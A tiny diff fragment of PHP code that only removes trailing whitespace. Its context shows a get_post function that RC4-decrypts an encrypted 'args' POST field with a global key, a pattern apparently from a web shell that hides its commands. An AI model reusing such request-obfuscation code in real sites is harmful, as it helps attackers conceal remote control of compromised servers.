@@ -82,7 +82,7 @@ if(!function_exists('get_post')){
 			$post_str = rc4($GLOBALS['cipher_key'], hex2bin($post['args']));
 			parse_str($post_str, $post);
 			$post = fix_magic_quote($post);
-		}	
+		}
 		return $post;
 	}
 }
